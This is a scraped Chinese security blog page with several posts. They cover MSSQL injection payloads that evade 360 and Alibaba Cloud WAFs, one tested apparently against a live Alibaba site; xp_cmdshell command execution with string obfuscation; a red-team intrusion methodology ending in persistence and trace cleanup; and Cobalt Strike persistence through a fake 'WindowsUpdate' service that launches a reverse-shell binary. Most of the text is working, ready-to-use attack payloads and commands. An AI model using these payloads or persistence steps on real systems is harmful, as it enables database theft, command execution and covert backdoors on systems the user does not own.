<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726200253396.png" alt="image-20200726200253396"></p>
<p>exec和xp_dirtree之间的空格也可以使用空白字符，我测了%11绕不过去，也可以fuzz一下，不过这个站速度挺慢的，这里就简单提供一个思路。针对aspx的站，虽然也可以使用unicode编码，不过使用的比较受限，这里测试了字符e的unicode编码%004e，是绕不过去的。</p>
<p><strong>命令执行</strong></p>
<p>也可以使用–xxx%0a这样的语法进行绕过。</p>
<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726212927798.png" alt="image-20200726212927798"></p>
<p>其实也有其他的绕过方式，比如通过exec函数来执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exec(&#39;x&#39;+&#39;p_c&#39;+&#39;mds&#39;+&#39;hell &#39;&#39;whoami&#39;&#39;&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726213916436.png" alt="image-20200726213916436"></p>
<p>或者通过变量定义的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @test nvarchar(50) set @test&#x3D;&#39;e&#39;+&#39;x&#39;+&#39;e&#39;+&#39;c x&#39;+&#39;p_&#39;+&#39;c&#39;+&#39;mdshell &#39;&#39;whoami&#39;&#39;&#39; exec--%0asp_executesql @test--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/MSSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB/image-20200726214833741.png" alt="image-20200726214833741"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 在进行WAF绕过时，其实我认为最好还是先去测那种通用绕过方案，比如参数污染，静态资源白名单，改变请求类型，因为这样可以全局绕过WAF，又能最少的触发拦截规则，如果要手动去根据规则绕的话，难免某些语句会触发拦截规则，如果在某些红蓝对抗的项目中，不就被发现了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/" class="post-title-link" itemprop="url">记MSSQL绕过阿里云</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-26 11:17:07" itemprop="dateCreated datePublished" datetime="2020-07-26T11:17:07+08:00">2020-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-07-29 17:00:04" itemprop="dateModified" datetime="2020-07-29T17:00:04+08:00">2020-07-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最近一直在学习关于WAF绕过的知识，本次选择阿里云这款云WAF来测试关于MSSQL注入的绕过。因为阿里云主站可能不</span><br><span class="line">是ASP+IIS的环境，所以我不清楚如果真的是ASP+IIS的环境，阿里云的拦截规则是否会有相应的变化。</span><br></pre></td></tr></table></figure>

<h2 id="绕过过程"><a href="#绕过过程" class="headerlink" title="绕过过程"></a>绕过过程</h2><h3 id="逻辑判断语句绕过"><a href="#逻辑判断语句绕过" class="headerlink" title="逻辑判断语句绕过"></a>逻辑判断语句绕过</h3><p>我们知道在检测一个注入点的时候，首先会加上and 1=1之类的判断语句，如果页面返回的逻辑符合我们设想的逻辑，那么就有可能有注入。</p>
<p><strong>利用%特性绕过</strong></p>
<p>在iis+asp的环境中，在关键字中间加%不会影响程序的正常执行，因此可以在关键字and中添加%来绕过阿里云的检测。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726131616934.png" alt="image-20200726131616934"></p>
<p><strong>利用unicode编码绕过</strong></p>
<p>在ASP+IIS环境中，有某些特性的字符可能会有多个unicode编码，因此可以通过对关键字进行unicode编码进行绕过，比如字符A有多个unicode编码，使用%u0061，%u0041等可能无法绕过，但是使用%u00AA则可以绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132202139.png" alt="image-20200726132202139"></p>
<p><strong>参数污染</strong></p>
<p>同样，我们也可以使用参数污染来绕过阿里云的检测，可能阿里云这种云WAF在设计上没有考虑到容器特性导致的绕过，只是适配于大多数网站的一般防护。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726132416572.png" alt="image-20200726132416572"></p>
<h3 id="绕过order-by拦截"><a href="#绕过order-by拦截" class="headerlink" title="绕过order by拦截"></a>绕过order by拦截</h3><p>阿里云对order by的拦截比较奇怪，如果order by后面跟的是个字符，则不会拦截，跟的是数字就会拦截，因此我们可以这样构造,order by “a”,1</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726133941676.png" alt="image-20200726133941676"></p>
<p>上面是针对阿里云拦截的通用绕过方法，我们也可以结合asp的特性来进行绕过，比如%,参数污染等等</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134347117.png" alt="image-20200726134347117"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134426821.png" alt="image-20200726134426821"></p>
<p>换行+注释，这里阿里云是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--%0a 不拦截，这个是mssql的注释+换行</span><br><span class="line">--+%0a 拦截，mysql注释+换行</span><br></pre></td></tr></table></figure>

<p>这就可以说明阿里云这款云WAF的主要拦截规则是为mysql设计的，至少在edu.aliyun.com这个站是这样的，至于其他的网站，我没有找到用阿里云的asp的站，所以没有测试。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726134723900.png" alt="image-20200726134723900"></p>
<h3 id="联合注入绕过"><a href="#联合注入绕过" class="headerlink" title="联合注入绕过"></a>联合注入绕过</h3><p>在ASP+IIS的环境中，%11等也可以代替空白字符，这个阿里云也没有考虑到，因此也可以达到绕过的目的。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135438964.png" alt="image-20200726135438964"></p>
<p>至于union和select之后的其他字符，并不会被拦截</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726135841710.png" alt="image-20200726135841710"></p>
<p>假如现在要通过union注入获取数据，比如version，数据库等等，我们看下怎么绕过。</p>
<h4 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h4><p>比如获取version，直接使用version关键字是不拦的，只有使用@@version时才会拦截。而且单独的@@version也是会被阿里云拦截的</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140854413.png" alt="image-20200726140854413"></p>
<p>所以这里要绕过的话，就是要想办法破坏@@version这个关键字，方法也挺多的。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726140950076.png" alt="image-20200726140950076"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141003116.png" alt="image-20200726141003116"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141022204.png" alt="image-20200726141022204"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141048780.png" alt="image-20200726141048780"></p>
<h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><p>使用db_name()获取数据库，这个直接没有拦截，没什么好说的</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141206749.png" alt="image-20200726141206749"></p>
<p>获取其他的数据库，源语句如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,null,null,name from master..sysdatabases where name not in(&#39;master&#39;)</span><br></pre></td></tr></table></figure>

<p>前面union select的绕过方法不变，这里我测试过程中发现当我使用master..sysdatabases会被阿里云拦截。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726141611877.png" alt="image-20200726141611877"></p>
<p>但是master..sysdatabases单独出现并不会被拦截，因此绕过的思路有两种，第一种是破坏master..sysdatabases出现的上下文环境，另一种就是就是对这个关键字自身做一些操作。</p>
<p><strong>方法一：参数污染</strong></p>
<p>使用这种方式进行处理，就是破坏这个关键字出现的上下问环境</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142000412.png" alt="image-20200726142000412"></p>
<p><strong>方法二：破坏关键字本身</strong></p>
<p>这里阿里云是将master..sysdatabases整体当作一个拦截规则进行拦截的，因此我们可以破坏这个关键字本身来达到绕过的目的。</p>
<p>注释+换行，在.中间加上注释和换行不会影响程序的正常解析，但是却可以绕过阿里云</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142708993.png" alt="image-20200726142708993"></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142729333.png" alt="image-20200726142729333"></p>
<p>当然，我们也可以使用unicode编码</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726142856285.png" alt="image-20200726142856285"></p>
<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>这个阿里云不拦截，因此没什么好说的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from 数据库名..sysobjects  where xtype&#x3D;&#39;U&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726143029949.png" alt="image-20200726143029949"></p>
<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects  where id&#x3D;(select id </span><br><span class="line">from sysobjects WHERE name &#x3D; &#39;表名&#39;)</span><br></pre></td></tr></table></figure>

<p>这里阿里云拦截了select id from这部分，但是单独的select id from是不会拦截的，所以我们要把这个语句放在上下问环境下来测试绕过。首先我发现select xxx也是会被拦截的，我在select中假如了%达到了此处的绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726144229258.png" alt="image-20200726144229258"></p>
<p>后面的部分也就不会拦截了,所以绕过语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11sysobjects where id&#x3D;(sele%ct id from sysobjects where name&#x3D;&#39;x&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145119306.png" alt="image-20200726145119306"></p>
<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>这个没啥说的，本身就可以直接绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union--xxxx%0aselect null,null,null,name from%11数据库..表名</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726145308997.png" alt="image-20200726145308997"></p>
<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><p>很多时候我们拿到MSSQL的注入，可能是直接执行命令而不是出数据，对吧？</p>
<p>首先是不是要判断能不能执行多语句，我最常用的是waitfor delay ’00：00：05‘这样的语句来判断是否支持多语句，所以我们首先看下怎么使用这个语句绕过阿里云。</p>
<p>这里讲一下，我在对WAF进行绕过测试的思路。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先，我要判断出这个WAF的拦截规则，比如waitfor delay ’00：00：05‘，这个直接会被阿里云拦的,所以我要</span><br><span class="line">判断是那部分被阿里云拦了。这里的绕过测试其实和免杀的方法类似，就是特征码定位，比如，我删除了delay后面的</span><br><span class="line">部分，还是会被拦，因此&#39;00:00:05&#39;并不是WAF拦截的部分，我再删除了delay发现不烂了，因此，可能拦截的就</span><br><span class="line">是waitfor delay这个关键字。</span><br></pre></td></tr></table></figure>

<p><strong>绕过一：unicode编码</strong></p>
<p>通过之前的测试，我们知道关键字a的unicode编码是没有被阿里云拦截的，因此我们可以通过unicode编码绕过。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150126019.png" alt="image-20200726150126019"></p>
<p><strong>绕过二：空白字符</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150214566.png" alt="image-20200726150214566"></p>
<p><strong>绕过三：注释+换行</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150252014.png" alt="image-20200726150252014"></p>
<p>然后假如我们要调用xp_cmdshell执行命令，该怎么绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;whoami&#39;</span><br></pre></td></tr></table></figure>

<p>这里我经过测试，发现当exec和 master..xp_cmdshell一起出现时，则会被拦截，因此绕过一方面时破坏exec和master..xp_cmdshell中间的内容，还有就是master..xpcmdshell本身。可能是这个比较重要，我这里发现，当</p>
<p>exec 和xp_cmdshell同时出现，不管中间是什么字符，都会被拦截。</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150806727.png" alt="image-20200726150806727"></p>
<p><strong>绕过一：参数污染</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150914069.png" alt="image-20200726150914069"></p>
<p><strong>绕过二：%</strong></p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726150953254.png" alt="image-20200726150953254"></p>
<p><strong>绕过三：unicode编码</strong></p>
<p>我这里找了个e的unicode编码进行绕过</p>
<p><img src="/2020/07/26/%E8%AE%B0MSSQL%E7%BB%95%E8%BF%87%E9%98%BF%E9%87%8C%E4%BA%91/image-20200726151055989.png" alt="image-20200726151055989"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    其实这些方法在几年前都有很多大佬总结过，我也不过是按照他们提供的思路进行尝试，这里会发现云WAF的一个问题，就是他们针对于mysql拦截的比较全面，但是对于其他的数据库，可能没有那么全面。还有一些针对于容器的绕过方法，比如参数污染，%,甚至在aspx中还有%00特性也没有考虑到，当然，这个也有可能是因为我测试的这个站不是用的ASP+IIS的环境，才能让我顺利绕过。总之，WAF也是人写的，并没有那么可怕。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/20/%E6%88%91%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/" class="post-title-link" itemprop="url">我的渗透之路</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-07-20 20:09:15 / Modified: 21:19:43" itemprop="dateCreated datePublished" datetime="2020-07-20T20:09:15+08:00">2020-07-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不加检点的人生不值一过。</span><br></pre></td></tr></table></figure>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    最近可能是因为技术处于一个瓶颈期，又或者说对未来技术发展方向有些迷茫，所以写下这篇文章梳理一下当前自身的技能树以及未来的发展方向。</p>
<h2 id="我的渗透观"><a href="#我的渗透观" class="headerlink" title="我的渗透观"></a>我的渗透观</h2><p>​    根据我自己对于渗透的理解，把渗透分为如下几个步骤：</p>
<p><strong>信息搜集</strong></p>
<p>​    这里的信息搜集不仅仅局限于对于目标开放的web资产的情况进行搜集，也可以是人员信息，一些历史漏洞，或者信息泄露的收集，总之一些有利于我们对目标系统进行攻击的信息都可以是我们收集的范围之内。在信息搜集的过程中，我们需要根据自己搜集的结果分析目标可能比较脆弱的点，比如一些VPN,OA,邮件系统或者说是企业内部自用的一些系统。对于这些系统的攻击，我们除了可以猜弱口令或爆破外，也可以去通过钓鱼，信息泄露或者其他途径获取的密码去获得这些系统的访问权限。又或者说有一些比较知名并且非常方便去利用的RCE，比如Weblogic，Shior，Thinkphp,Struts2等等，目标哪些系统使用了这些框架也是我们在信息搜集过程中要做的。</p>
<p>​    总之，我认为渗透的信息搜集不仅仅是包含了资产收集的步骤，还应该包含目标分析的步骤，这个阶段的结果对我们来说尤其重要，直接决定了我们后续活动的重心，因此，我认为在这个阶段我们可以花费较多的时间去搜集、整理、分析、筛选目标。</p>
<p><strong>漏洞挖掘</strong></p>
<p>​    同样，这里的漏洞挖掘并非狭义的指一些web漏洞的挖掘，而是目标整个防御体系的缺陷，任何有可能帮助我们突破目标防御的点都值得我们去深入挖掘。这个步骤我们需要注意的就是明确目标，我们所挖掘的任何信息或者漏洞目的只有一个，为了帮助我们获取目标的一个根据点，不要花费精力去挖一些对于本次活动没什么帮助的漏洞。</p>
<p>​    就我个人来讲，我不是很喜欢这个过程，可能因为我很少挖到那种比较开脑洞的漏洞，让我觉得挖洞是一个体力活，相比漏洞挖掘，我更喜欢下一个过程。</p>
<p><strong>漏洞利用</strong></p>
<p>​    这个过程的目的就是通过我们前面这些步骤操作所挖掘到系统存在的问题，然后通过一些组合利用，让我们获取一个进入目标内网的一个口子，也可以说是突破目标边界。</p>
<p>​    为什么我喜欢这个过程，因为我喜欢了解漏洞的原理，而且在漏洞利用这个过程我认为比较有趣，尤其是遇到各种拦截，需要我们通过自己的知识去bypass，还有就是因为可能目标环境的问题影响，可能导致虽然是同一种漏洞，但是利用的方法都不太一样。</p>
<p>​    通过漏洞的组合利用，我们最终构建了一个进入目标内网的通道，这个通道可以是一个反弹shell,一个马，一个http隧道，socks隧道。</p>
<p><strong>内网信息搜集</strong></p>
<p>​    当我们进入内网后，我们可能对目标内网是一无所知的，也不知道我们最终的目标在哪里，所以需要进行各种信息搜集，搜集这些信息的目的，主要还是为了定位目标的地址，构建一个从我们至目标的一个可达的途径。主要搜集的一个是目标内网的一个拓扑，通过这个拓扑我们就可以知道目标在哪个位置，还有一个就是目标内网的各种主机和服务的密码，很多时候，我们渗透内网的方式非常的简单粗暴，就是不停的搜集资产，抓密码，撞密码的过程。</p>
<p>​    因为在某些活动中，我们获取一个内网权限来之不易，为了防止我们在操作的过程中被发现导致权限丢掉了，我认为在内网信息搜集前，应该先想办法去巩固我们的权限，比如多种几个隐秘的shell，还有就是对当前主机的一个权限维持。</p>
<p><strong>内网横向渗透</strong></p>
<p>​    关于内网横向渗透，我认为这个过程和漏洞挖掘的过程类似，就是一定要明确我们的目标，假如我们的目的只是内网中的某一个系统，那么去打一圈，控很多系统对我们实际是没有用的，我认为在内网渗透，应该尽量减少我们不必要的操作，因为我们每个操作都有可能给对方留下日志，增加了被发现的风险。</p>
<p>​    单纯从控更多主机来看的话，首选是通过主机密码去撞，现在还是有很多内网使用通用密码的，其次是通过各种服务的弱口令去搞，比如MSSQL，redis等，这些服务也比较容易帮助我们获取主机权限。再次，就是通过各种高危的web服务，weblogic,struts2等等去搞，最后再去搞目标的其他内网的系统。</p>
<p>​    也有一种思路就是去针对指定用户比如科技部，信息安全部的内网的邮件，oa系统进行攻击，这些人员可能有内网的各种系统的账号密码，如果能控这个人员的个人机也是非常不错的。</p>
<p><strong>最后</strong></p>
<p>​    为什么直接到最后了，经过内网的横向渗透，我们可能已经拿到了我们想要的目标，这时剩下的操作就是两个，一个是权限维持，另一个是痕迹清理，根据自己的需要执行对应的操作就可以了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-title-link" itemprop="url">使用cobaltstrike权限维持</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-02-12 13:57:24 / Modified: 23:24:40" itemprop="dateCreated datePublished" datetime="2020-02-12T13:57:24+08:00">2020-02-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    在我们获取一个beacon后，为了防止掉线，或者防止目标重启后权限丢失，需要进行权限维持，我这里使用Erebus插件进行权限维持。当然这个插件还有其他功能，我这里仅仅对权限维持这部分的功能进行测试。有service、IFEO和AutoRun三种。插件地址：<a href="https://github.com/DeEpinGh0st/Erebus" target="_blank" rel="noopener">Erebus</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">既然要进行权限维持，首先是需要在获取高权的基础上，有两方面因素:</span><br><span class="line">第一点就是获取低权权限维持的意义不大,</span><br><span class="line">第二点是低权无法进行注册表修改等等操作，也不好进行权限维持.</span><br></pre></td></tr></table></figure>

<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>使用service进行权限维持，当开启服务后，即可使目标上线。以下是测试过程：</p>
<p>首先使用cs获取权限</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210204445767.png" alt="image-20200210204445767"></p>
<p>然后将我们想要执行的exe上传到目标机器上，我这里是使用cs生成了一个exe，执行后可以反弹shell。</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210204951391.png" alt="image-20200210204951391"></p>
<p>通过Erebus插件添加服务，选择Persistence-&gt;service。</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210211402844.png" alt="image-20200210211402844"></p>
<p>添加一个服务，上面的那个参数是服务名，下面的参数是这个服务运行时执行的文件。</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210211725936.png" alt="image-20200210211725936"></p>
<p>使用这种方式进行权限维持，本质上是执行了如下的命令，不过是写成插件以后比较方便。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;WindowsUpdate&quot; binpath&#x3D; &quot;cmd &#x2F;c start &quot;C:\Users\admin\Desktop\artifact.exe&quot;&quot;&amp;&amp;sc config &quot;WindowsUpdate&quot; start&#x3D; auto&amp;&amp;net start  WindowsUpdate</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200212232104780.png" alt="image-20200212232104780"></p>
<p>执行成功后，会返回system的shell，无需重启</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212033229.png" alt="image-20200210212033229"></p>
<p>然后我们重启受害机进行测试，shell仍然存在</p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212244400.png" alt="image-20200210212244400"></p>
<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210212421777.png" alt="image-20200210212421777"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc delete WindowsUpdate 删除服务</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20200210214933364.png" alt="image-20200210214933364"></p>
<h2 id="IFEO映像劫持"><a href="#IFEO映像劫持" class="headerlink" title="IFEO映像劫持"></a>IFEO映像劫持</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">映像劫持：某个操作的时候被拦截下来，干了别的事。</span><br></pre></td></tr></table></figure>

<p>使用IFEO可以实现后门持久化,可以实现系统在未登录状态下，通过快捷键运行自己的程序。比如：Windows + U组合键时启动的utilman.exe，或者5次shift替换粘滞键。</p>
